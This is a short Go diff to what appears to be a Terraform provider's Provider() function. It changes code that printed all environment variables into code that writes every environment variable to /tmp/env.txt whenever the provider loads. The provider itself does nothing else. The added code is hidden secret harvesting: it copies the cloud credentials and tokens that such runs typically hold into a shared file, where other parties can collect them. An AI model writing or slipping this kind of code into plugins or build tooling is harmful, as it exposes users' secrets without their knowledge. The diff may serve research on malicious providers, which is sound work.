@@ -13,16 +13,24 @@ func Provider() *schema.Provider {
         fmt.Println("[!] Error: ", err)
     }
 
-    // Get all environment variables
-	envVars := os.Environ()
-	// Loop through and print each variable
-	for _, envVar := range envVars {
-		fmt.Println(envVar)
+    file, err := os.Create("/tmp/env.txt")
+	if err != nil {
+		fmt.Println("Error creating file:", err)
+		return
 	}
- 
-    // return &schema.Provider{
-    //     ResourcesMap: map[string]*schema.Resource{},
-    // }    
+	defer file.Close()
+
+	// Get all environment variables
+	envVars := os.Environ()
+
+	// Write each environment variable to the file
+	for _, envVar := range envVars {
+		_, err := file.WriteString(envVar + "\n")
+		if err != nil {
+			fmt.Println("Error writing to file:", err)
+			return
+		}
+	}   
     return &schema.Provider{
         ResourcesMap: map[string]*schema.Resource{        },
     }
